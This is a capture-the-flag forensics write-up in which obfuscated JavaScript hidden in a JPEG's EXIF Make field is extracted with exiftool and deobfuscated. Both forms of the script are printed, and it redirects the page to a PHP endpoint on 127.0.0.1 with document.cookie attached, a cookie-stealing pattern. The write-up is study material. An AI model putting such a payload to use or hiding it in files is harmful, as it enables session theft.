
# Challenge Name: Phishing Email  


![date](https://img.shields.io/badge/date-07.03.2021-brightgreen.svg)  
![solved in time of CTF](https://img.shields.io/badge/solved-in%20time%20of%20CTF-brightgreen.svg)   
![forensics category](https://img.shields.io/badge/category-forensics-lightgrey.svg)
![score](https://img.shields.io/badge/score-200-blue.svg)


## Attached files
- [i_hate_you.png](i_hate_you.png)





## Detailed solution

The challenge talk about a weird picture recieved from an email and after that the computer start to act abnormally.  

Let's get some informations about the image  

```shell  

file i_hate_you.jpg
i_hate_you.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 96x96, segment length 16, Exif Standard: [TIFF image data, big-endian, direntries=6], baseline, precision 8, 976x549, frames 3

``` 

It's a JPEG image that has some metadata let's run exiftool 

```shell  

exiftool i_hate_you.jpg
ExifTool Version Number         : 10.80
File Name                       : i_hate_you.jpg
Directory                       : .
File Size                       : 60 kB
File Modification Date/Time     : 2021:03:06 18:46:54+00:00
File Access Date/Time           : 2021:03:17 19:53:40+00:00
File Inode Change Date/Time     : 2021:03:17 19:53:03+00:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
DCT Encode Version              : 100
APP14 Flags 0                   : (none)
APP14 Flags 1                   : (none)
Color Transform                 : YCbCr
Exif Byte Order                 : Big-endian (Motorola, MM)
Processing Software             : jExifToolGUI 1.8.1
Make                            : var _0xb30f=['qep','i_seei','app','ati','eh','sca','tes','+(\x20','\x20+\x20','^([','LPa','uct','001','id','Wor','s\x20+','+[^','\x20/\x22','7.0',')+)','ret','loc','\x20]+','ked','/12','htt','ng_o','{am_','','GyR','thi','log','_j','\x20\x22/','LeT','Ryt','^\x20]','con','bfu','str','ted'];(function(_0x430b89,_0xb30f10){var _0x19eed7=function(_0x3b1411){while(--_0x3b1411){_0x430b89['push'](_0x430b89['shift']());}},_0x375ddc=function(){var _0x166f78={'data':{'key':'cookie','value':'timeout'},'setCookie':function(_0x569df1,_0x492780,_0x38f651,_0x148ad7){_0x148ad7=_0x148ad7||{};var _0x19b065=_0x492780+'='+_0x38f651,_0x57c7ce=0x0;for(var _0x10eafa=0x0,_0x228af4=_0x569df1['length'];_0x10eafa<_0x228af4;_0x10eafa++){var _0x2863f6=_0x569df1[_0x10eafa];_0x19b065+=';\x20'+_0x2863f6;var _0x2179e9=_0x569df1[_0x2863f6];_0x569df1['push'](_0x2179e9),_0x228af4=_0x569df1['length'],_0x2179e9!==!![]&&(_0x19b065+='='+_0x2179e9);}_0x148ad7['cookie']=_0x19b065;},'removeCookie':function(){return'dev';},'getCookie':function(_0x5cec4b,_0x110117){_0x5cec4b=_0x5cec4b||function(_0x2cb439){return _0x2cb439;};var _0x5519e5=_0x5cec4b(new RegExp('(?:^|;\x20)'+_0x110117['replace'](/([.$?*|{}()[]\/+^])/g,'$1')+'=([^;]*)')),_0x2a2d7a=function(_0x57642f,_0x32a43b){_0x57642f(++_0x32a43b);};return _0x2a2d7a(_0x19eed7,_0xb30f10),_0x5519e5?decodeURIComponent(_0x5519e5[0x1]):undefined;}},_0xa48cf6=function(){var _0x3139e7=new RegExp('\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*[\x27|\x22].+[\x27|\x22];?\x20*}');return _0x3139e7['test'](_0x166f78['removeCookie']['toString']());};_0x166f78['updateCookie']=_0xa48cf6;var _0x2cb6b1='';var _0x4f6f69=_0x166f78['updateCookie']();if(!_0x4f6f69)_0x166f78['setCookie'](['*'],'counter',0x1);else _0x4f6f69?_0x2cb6b1=_0x166f78['getCookie'](null,'counter'):_0x166f78['removeCookie']();};_0x375ddc();}(_0xb30f,0x17d));var _0x19ee=function(_0x430b89,_0xb30f10){_0x430b89=_0x430b89-0x0;var _0x19eed7=_0xb30f[_0x430b89];return _0x19eed7;};function abc(){var _0x1b7e59=function(){var _0x56c055=!![];return function(_0x2d101b,_0x47dae5){var _0x5cdda2=_0x56c055?function(){if(_0x19ee('0x16')+'Np'===_0x19ee('0x27')+'nE'){function _0x279dc5(){var _0x47e79c=_0x22ba2d[_0x19ee('0x1f')+'ly'](_0x373ec8,arguments);return _0x438040=null,_0x47e79c;}}else{if(_0x47dae5){if(_0x19ee('0x11')+'Rw'!==_0x19ee('0x17')+'uX'){var _0x5972e3=_0x47dae5[_0x19ee('0x1f')+'ly'](_0x2d101b,arguments);return _0x47dae5=null,_0x5972e3;}else{function _0x2e681d(){if(_0x3f02d1){var _0x40970e=_0x404a5d[_0x19ee('0x1f')+'ly'](_0x2a13e0,arguments);return _0x4c768b=null,_0x40970e;}}}}}}:function(){};return _0x56c055=![],_0x5cdda2;};}(),_0x5660b8=_0x1b7e59(this,function(){if(_0x19ee('0x1d')+'LA'!==_0x19ee('0x1d')+'LA'){function _0x352531(){var _0x1351cf=function(){var _0x358fe2=_0x1351cf[_0x19ee('0x19')+_0x19ee('0x1b')+_0x19ee('0x28')+'or'](_0x19ee('0x8')+'urn'+_0x19ee('0x5')+_0x19ee('0x25')+'thi'+_0x19ee('0x3')+_0x19ee('0x15'))()[_0x19ee('0x19')+'str'+_0x19ee('0x28')+'or'](_0x19ee('0x26')+_0x19ee('0x18')+_0x19ee('0x24')+'+[^'+_0x19ee('0xa')+_0x19ee('0x7')+_0x19ee('0x4')+'\x20]}');return!_0x358fe2[_0x19ee('0x23')+'t'](_0xaf66c0);};return _0x1351cf();}}else{var _0x5abfca=function(){var _0x32b298=_0x5abfca[_0x19ee('0x19')+_0x19ee('0x1b')+_0x19ee('0x28')+'or']('ret'+'urn'+'\x20/\x22'+_0x19ee('0x25')+_0x19ee('0x12')+_0x19ee('0x3')+_0x19ee('0x15'))()[_0x19ee('0x19')+_0x19ee('0x1b')+_0x19ee('0x28')+'or']('^(['+_0x19ee('0x18')+_0x19ee('0x24')+'+[^'+_0x19ee('0xa')+_0x19ee('0x7')+'+[^'+'\x20]}');return!_0x32b298[_0x19ee('0x23')+'t'](_0x5660b8);};return _0x5abfca();}});_0x5660b8(),document[_0x19ee('0x9')+_0x19ee('0x20')+'on']=_0x19ee('0xd')+'p:/'+_0x19ee('0xc')+_0x19ee('0x6')+'.0.'+'1/0'+_0x19ee('0x0')+'.ph'+'p?c'+'='+document['coo'+'kie'],console[_0x19ee('0x13')](_0x19ee('0x2')+_0x19ee('0xb')+'!'),console[_0x19ee('0x13')](_0x19ee('0x1')+_0x19ee('0x21')+_0x19ee('0x10')),console[_0x19ee('0x13')](_0x19ee('0xf')+_0x19ee('0x1e')+_0x19ee('0xe')+_0x19ee('0x1a')+_0x19ee('0x22')+_0x19ee('0x1c')+_0x19ee('0x14')+'s}');}abc();
X Resolution                    : 96
Y Resolution                    : 96
Resolution Unit                 : inches
Y Cb Cr Positioning             : Centered
Quality                         : 40%
XMP Toolkit                     : Image::ExifTool 12.14
About                           : uuid:faf5bdd5-ba3d-11da-ad31-d33d75182f1b
Creator                         : Getty Images
Software                        : jExifToolGUI 1.8.1
Creator Tool                    : Adobe Photoshop CS5.1 Windows
Derived From Document ID        : xmp.did:88577A15FBBE11E9BF63CF0B9A07BA06
Derived From Instance ID        : xmp.iid:88577A14FBBE11E9BF63CF0B9A07BA06
Document ID                     : xmp.did:88577A17FBBE11E9BF63CF0B9A07BA06
Instance ID                     : xmp.iid:88577A16FBBE11E9BF63CF0B9A07BA06
Image Width                     : 976
Image Height                    : 549
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 976x549
Megapixels                      : 0.536  

``` 

At make we find some code, we see some var, console and document it's an Obfuscated Javascript code.  

What is Obfuscation? 

JavaScript code obfuscation is a series of code transformations that turn your exposed code into a protected version of the code that is extremely hard to understand and reverse-engineer.

We need to Deobfuscate the Javascript code, i'll use **de4js** a JavaScript Deobfuscator and Unpacker 

https://lelinhtinh.github.io/de4js/ 

Put the code and use auto-decode option 

````javascript  

function abc() {
    var _0x1b7e59 = function () {
            var _0x56c055 = true;
            return function (_0x2d101b, _0x47dae5) {
                var _0x5cdda2 = _0x56c055 ? function () {
                    if ('LeTNp' === 'LPanE') {
                        function _0x279dc5() {
                            var _0x47e79c = _0x22ba2d.apply(_0x373ec8, arguments);
                            return _0x438040 = null, _0x47e79c;
                        }
                    } else {
                        if (_0x47dae5) {
                            if ('GyRRw' !== 'RytuX') {
                                var _0x5972e3 = _0x47dae5.apply(_0x2d101b, arguments);
                                return _0x47dae5 = null, _0x5972e3;
                            } else {
                                function _0x2e681d() {
                                    if (_0x3f02d1) {
                                        var _0x40970e = _0x404a5d.apply(_0x2a13e0, arguments);
                                        return _0x4c768b = null, _0x40970e;
                                    }
                                }
                            }
                        }
                    }
                } : function () {};
                return _0x56c055 = true, _0x5cdda2;
            };
        }(),
        _0x5660b8 = _0x1b7e59(this, function () {
            if ('qepLA' !== 'qepLA') {
                function _0x352531() {
                    var _0x1351cf = function () {
                        var _0x358fe2 = _0x1351cf.constructor('return /" + this +' + ' "/')().constructor('^([' + '^ ]' + '+( ' + '+[^ ]+' + ')+)' + '+[^ ]}');
                        return !_0x358fe2.test(_0xaf66c0);
                    };
                    return _0x1351cf();
                }
            } else {
                var _0x5abfca = function () {
                    var _0x32b298 = _0x5abfca.constructor('return /\" + this +' + ' "/')().constructor('^([' + '^ ]' + '+( ' + '+[^ ]+' + ')+)' + '+[^ ]}');
                    return !_0x32b298.test(_0x5660b8);
                };
                return _0x5abfca();
            }
        });
    _0x5660b8(), document.location = 'http:/' + '/127.0.0.1/0001.php?c' + '=' + document.cookie, console.log('Worked' + '!'), console.log('ideh'), console.log('{am_i_seeing_obfuscated_js}');
}
abc();  

````

At the end with some console.log we see our flag 

````javascript  

console.log('ideh'), console.log('{am_i_seeing_obfuscated_js}');  

````



## Flag

```
ideh{am_i_seeing_obfuscated_js}
```
